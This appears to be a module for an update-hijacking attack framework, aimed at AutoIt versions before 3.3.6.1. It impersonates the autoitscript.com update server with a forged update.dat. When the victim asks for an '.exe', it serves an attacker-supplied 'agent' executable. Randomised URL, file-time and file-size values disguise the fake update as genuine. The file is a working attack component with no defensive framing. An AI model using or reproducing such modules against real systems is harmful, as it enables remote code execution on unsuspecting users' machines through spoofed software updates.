from modules import ModuleBase


class AutoItScript3(ModuleBase):
    name = 'AutoIt Script 3'
    version = '1.0'
    appver = '< 3.3.6.1'
    author = ['Leandro Costantino < lcostantino +[AT]+ gmail.com>']
    description = """AutoIt Scripting Language""",
    vh = 'www.autoitscript.com' 
    requests = [
        {   'path': '/update.dat',
            'type': 'file',
            'method': '',
            'bin': '0',
            'string' : "",
            'parse': '1',
            'file': './include/autoit3/autoitscript.dat',
        },
        {   'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': '0',
            'file': ''
        }
    ]
    options = {
        'version_stable': {
            'val': '4.2.14.1',
            'desc': 'AutoIt Stable Version'
        },
        'version_beta': {
            'val': '4.2.15.1',
            'desc': 'AutoIt Beta Version'
        },

        'url': {
            'val' : "'http://www.autoitscript.com/files/autoit/autoit-' + rand_alpha(rand_num(1)) + '.exe'",
            'hidden': 1,
            'dynamic': 1,
        },
        'filetime': {
            'val' : " '20080' + rand_num(1) + rand_num(7, [1,2])  ",
            'dynamic': 1
        },
        'filesize': {
            'val' : " '2' + rand_num(5) ",
            'dynamic': 1
        }
    }